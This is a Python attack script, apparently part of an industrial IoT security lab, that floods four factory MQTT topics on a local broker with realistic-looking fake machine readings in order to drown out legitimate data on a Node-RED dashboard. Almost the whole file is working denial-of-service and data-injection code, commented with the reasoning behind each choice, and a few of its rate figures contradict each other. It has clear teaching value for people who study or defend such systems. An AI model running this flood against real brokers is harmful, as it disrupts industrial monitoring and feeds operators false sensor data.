import time
import json
import random
import threading
import paho.mqtt.client as mqtt
from datetime import datetime

# WHY this attack is different from Attack 1:
# Attack 1 = quality attack (carefully crafted fake values)
# Attack 2 = quantity attack (overwhelm with volume)
# The goal is not to inject specific false readings
# but to make the entire system unreliable and unresponsive

BROKER = "localhost"
PORT = 1883

# Attack configuration — based on recon findings
# Recon told us: 4 machines, topics factory/machine1-4/data
# Normal rate: ~82 messages/minute total across all machines
# Our flood rate: 500+ messages/second = 6x the normal rate
FLOOD_RATE_PER_SECOND = 50  # messages per second per thread
FLOOD_THREADS = 4            # one thread per machine topic
FLOOD_DURATION = 60          # seconds to run the attack

# Targets discovered during recon
TARGETS = [
    "factory/machine1/data",
    "factory/machine2/data",
    "factory/machine3/data",
    "factory/machine4/data"
]

# Shared counter across all threads
messages_sent = 0
counter_lock = threading.Lock()

def flood_thread(topic, machine_id, thread_id):
    """
    WHY separate threads per machine:
    Each thread floods one topic independently.
    4 threads × 50 messages/second = 200 messages/second total.
    Normal system sends ~1.3 messages/second total.
    We are sending 150x the normal volume.
    """
    global messages_sent

    client = mqtt.Client(
        client_id=f"flood_attacker_{thread_id}"
    )
    client.connect(BROKER, PORT, 60)
    client.loop_start()

    print(f"[Thread {thread_id}] Starting flood on {topic}")

    start_time = time.time()

    while time.time() - start_time < FLOOD_DURATION:
        # WHY random but valid-looking data:
        # We send data that LOOKS legitimate — valid machine_id,
        # valid status, reasonable temperature.
        # This makes it harder to filter out — you can't just
        # block "obviously fake" values.
        flood_payload = {
            "machine_id": machine_id,
            "status": random.choice(["ON", "OFF"]),
            "temperature": round(random.uniform(20, 90), 2),
            "production_count": random.randint(1, 99999),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "flood": True
        }

        client.publish(topic, json.dumps(flood_payload))

        with counter_lock:
            messages_sent += 1

        # WHY such a small sleep:
        # 1/FLOOD_RATE_PER_SECOND = 0.02 seconds between messages
        # This gives us ~50 messages/second per thread
        time.sleep(1 / FLOOD_RATE_PER_SECOND)

    client.loop_stop()
    client.disconnect()
    print(f"[Thread {thread_id}] Flood complete on {topic}")


def monitor_progress():
    """
    WHY a monitor thread:
    Shows us the attack progress in real time.
    Reports how many messages sent and current rate.
    """
    global messages_sent
    start_time = time.time()
    last_count = 0

    while time.time() - start_time < FLOOD_DURATION + 2:
        time.sleep(5)
        current = messages_sent
        rate = (current - last_count) / 5
        elapsed = time.time() - start_time
        print(f"[MONITOR] {current} messages sent | "
              f"Rate: {rate:.0f} msg/s | "
              f"Elapsed: {elapsed:.0f}s")
        last_count = current


# ── Main attack ──────────────────────────────────────────────

print("=" * 60)
print("ATTACK 2 — MQTT FLOOD (DoS)")
print("=" * 60)
print(f"Target broker  : {BROKER}:{PORT}")
print(f"Target topics  : {len(TARGETS)} machine topics")
print(f"Flood rate     : {FLOOD_RATE_PER_SECOND * FLOOD_THREADS}"
      f" messages/second")
print(f"Normal rate    : ~1.3 messages/second (from recon)")
print(f"Amplification  : "
      f"{FLOOD_RATE_PER_SECOND * FLOOD_THREADS / 1.3:.0f}x"
      f" normal volume")
print(f"Duration       : {FLOOD_DURATION} seconds")
print("=" * 60)
print()
print("Watch your Node-RED dashboard — it will become")
print("unreliable as legitimate data drowns in flood.")
print()

# Start monitor thread
monitor = threading.Thread(target=monitor_progress, daemon=True)
monitor.start()

# Start one flood thread per machine topic
threads = []
for i, topic in enumerate(TARGETS):
    machine_id = f"machine{i+1}"
    t = threading.Thread(
        target=flood_thread,
        args=(topic, machine_id, i+1),
        daemon=True
    )
    threads.append(t)
    t.start()
    time.sleep(0.1)  # slight stagger so threads don't all start at once

# Wait for all flood threads to finish
for t in threads:
    t.join()

print()
print("=" * 60)
print("FLOOD ATTACK COMPLETE")
print(f"Total messages sent: {messages_sent}")
print(f"Normal messages in same period: "
      f"~{int(FLOOD_DURATION * 1.3)}")
print(f"Ratio of fake to real: "
      f"{messages_sent / max(int(FLOOD_DURATION * 1.3), 1):.0f}:1")
print("=" * 60)